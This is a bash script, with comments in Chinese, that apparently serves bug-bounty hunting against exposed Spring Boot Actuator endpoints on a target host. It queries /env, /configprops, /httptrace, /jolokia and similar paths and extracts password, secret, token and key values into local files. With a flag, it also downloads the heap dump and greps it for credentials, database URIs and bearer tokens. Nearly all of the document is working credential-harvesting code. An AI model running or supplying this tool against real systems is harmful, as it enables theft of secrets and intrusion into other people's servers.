#!/usr/bin/env bash
# hunt-actuator-deep.sh — Spring Boot Actuator 深度利用
# 來源：Spring Boot Actuator (public pattern, commonly duplicated)+ public Jenkins exposure pattern
#
# 超越 auto_hunt.sh 的基礎 /env 檢查：
#   - /heapdump 下載 + strings grep password/JWT/session
#   - /threaddump 洩漏執行緒 stack
#   - /mappings 全 endpoint 清單
#   - /beans 架構洩漏
#   - /env property 提取（propertySources）
#   - /configprops 配置值
#   - /jolokia JMX（很少見但危險）
#   - /loggers 可能改 log level
#   - /httptrace 最近 100 requests
#
# 用法：
#   ./hunt-actuator-deep.sh https://target
#   ./hunt-actuator-deep.sh https://target --heapdump     # 下載 heapdump (可能很大)
set -uo pipefail

HOST="${1:-}"
[ -z "$HOST" ] && { echo "Usage: $0 <https://host> [--heapdump]"; exit 1; }
HOST="${HOST%/}"
DO_HEAP=0
[ "${2:-}" = "--heapdump" ] && DO_HEAP=1

OUT_DIR="${OUT_DIR:-./actuator_out}"
mkdir -p "$OUT_DIR"
SLUG=$(echo "$HOST" | sed 's|https\?://||;s|[/:]|_|g')
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"

log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit(){ echo "🔴 $*" | tee -a "$OUT"; }
warn(){ echo "🟡 $*" | tee -a "$OUT"; }

log "=== Actuator deep hunt: $HOST ==="

# ── Discovery: /actuator + /actuator/ + /management ────────────
BASES=()
for B in "/actuator" "/management" "/admin" "/api/actuator"; do
  RESP=$(curl -sk --max-time 6 "${HOST}${B}")
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 "${HOST}${B}")
  if [[ "$CODE" =~ ^2 ]] && echo "$RESP" | grep -qE '"_links"|"self"'; then
    hit "actuator base: ${HOST}${B} [$CODE]"
    BASES+=("$B")
    # Parse endpoint list
    echo "$RESP" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    for name, link in d.get('_links', {}).items():
        if isinstance(link, dict):
            print(f'     endpoint: {name} → {link.get(\"href\",\"\")}')
except: pass" >> "$OUT"
  fi
done
[ ${#BASES[@]} -eq 0 ] && { log "no actuator base found — skip"; exit 0; }

BASE="${BASES[0]}"

# ── /env → propertySources 提取敏感值 ──────────────────────────
ENV_RESP=$(curl -sk --max-time 8 "${HOST}${BASE}/env")
if echo "$ENV_RESP" | grep -q 'propertySources'; then
  echo "$ENV_RESP" > "$OUT_DIR/${SLUG}_env.json"
  hit "/env propertySources exposed → $OUT_DIR/${SLUG}_env.json"
  # Extract sensitive property names
  echo "$ENV_RESP" | python3 -c "
import json, sys, re
try:
    d = json.load(sys.stdin)
    for src in d.get('propertySources', []):
        for k, v in (src.get('properties', {}) or {}).items():
            val = v.get('value','') if isinstance(v, dict) else str(v)
            if re.search(r'password|secret|token|key|credential|dsn|uri|url', k, re.I):
                # value might be '******' (Spring 2.x masking) or real
                if val and val != '******':
                    print(f'     🔴 {k} = {val[:80]}')
                else:
                    print(f'     🟡 {k} = {val} (masked but may leak via /configprops)')
except Exception as e: print(f'(parse err: {e})')
" >> "$OUT"
fi

# ── /configprops → 配置值（Spring 2.x 對 /env 做 masking，但 configprops 常沒 mask）─
CPROPS=$(curl -sk --max-time 8 "${HOST}${BASE}/configprops")
if echo "$CPROPS" | grep -q '"beans"\|"contexts"'; then
  echo "$CPROPS" > "$OUT_DIR/${SLUG}_configprops.json"
  hit "/configprops exposed → $OUT_DIR/${SLUG}_configprops.json"
  echo "$CPROPS" | python3 -c "
import json, sys, re
try:
    d = json.load(sys.stdin)
    def walk(obj, path=''):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, (dict, list)):
                    walk(v, path + '.' + k)
                elif isinstance(v, str) and re.search(r'password|secret|token|key|credential', k, re.I):
                    if v and v != '******':
                        print(f'     🔴 {path}.{k} = {v[:80]}')
        elif isinstance(obj, list):
            for i, x in enumerate(obj): walk(x, path + f'[{i}]')
    walk(d)
except Exception as e: print(f'(parse err: {e})')
" >> "$OUT"
fi

# ── /mappings → 全 endpoint 清單 ───────────────────────────────
MAP=$(curl -sk --max-time 8 "${HOST}${BASE}/mappings")
if echo "$MAP" | grep -q '"dispatcherServlets"\|"handlerMappings"'; then
  echo "$MAP" > "$OUT_DIR/${SLUG}_mappings.json"
  local N
  N=$(echo "$MAP" | grep -oE '"pattern":\s*"[^"]+"' | wc -l | tr -d ' ')
  hit "/mappings exposed: $N endpoint patterns → $OUT_DIR/${SLUG}_mappings.json"
fi

# ── /beans → 架構洩漏 ─────────────────────────────────────────
BEANS=$(curl -sk --max-time 8 "${HOST}${BASE}/beans")
if echo "$BEANS" | grep -q '"beans"\|"contexts"'; then
  echo "$BEANS" > "$OUT_DIR/${SLUG}_beans.json"
  hit "/beans exposed → $OUT_DIR/${SLUG}_beans.json"
fi

# ── /httptrace → 最近 requests（含 cookie / auth header） ──────
HT=$(curl -sk --max-time 8 "${HOST}${BASE}/httptrace")
if echo "$HT" | grep -q '"traces"'; then
  echo "$HT" > "$OUT_DIR/${SLUG}_httptrace.json"
  hit "/httptrace exposed: recent requests (may leak Authorization/Cookie headers) → $OUT_DIR/${SLUG}_httptrace.json"
fi

# ── /threaddump → 執行緒 stack ──────────────────────────────────
TD=$(curl -sk --max-time 8 "${HOST}${BASE}/threaddump")
if echo "$TD" | grep -q '"threads"\|threadName'; then
  hit "/threaddump exposed (stack traces leak class names / internal paths)"
fi

# ── /metrics ───────────────────────────────────────────────────
METRICS=$(curl -sk --max-time 8 "${HOST}${BASE}/metrics")
if echo "$METRICS" | grep -q '"names"'; then
  warn "/metrics exposed (metric names only, usually low-impact)"
fi

# ── /loggers → 可能改 runtime log level ───────────────────────
LG=$(curl -sk --max-time 8 "${HOST}${BASE}/loggers")
if echo "$LG" | grep -q '"loggers"'; then
  hit "/loggers exposed (POST can change log level at runtime → DEBUG leak)"
fi

# ── /jolokia → JMX（執行 MBean 操作，少見但危險）──────────────
JK=$(curl -sk --max-time 8 "${HOST}${BASE}/jolokia/version")
if echo "$JK" | grep -q '"agent"\|"protocol"'; then
  hit "/jolokia JMX exposed → MBean execution possible (P1 candidate)"
fi

# ── /heapdump ──────────────────────────────────────────────────
HD_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${HOST}${BASE}/heapdump")
if [[ "$HD_CODE" =~ ^2 ]]; then
  hit "/heapdump exposed [$HD_CODE] — can download memory dump"
  if [ "$DO_HEAP" = "1" ]; then
    log "downloading heapdump (may be large)..."
    HD_FILE="$OUT_DIR/${SLUG}_heapdump.bin"
    curl -sk --max-time 120 "${HOST}${BASE}/heapdump" -o "$HD_FILE"
    local HD_SIZE
    HD_SIZE=$(wc -c < "$HD_FILE" | tr -d ' ')
    hit "heapdump saved: $HD_SIZE bytes → $HD_FILE"
    log "grep strings for credentials..."
    strings "$HD_FILE" 2>/dev/null | \
      grep -iE "password=|secret=|token=|api[_-]?key|authorization:|bearer |jdbc:|mongodb://|postgres://" | \
      head -30 | while read L; do echo "     $L" >> "$OUT"; done
  else
    warn "  (re-run with --heapdump to download + grep credentials)"
  fi
fi

log "=== done → $OUT ==="
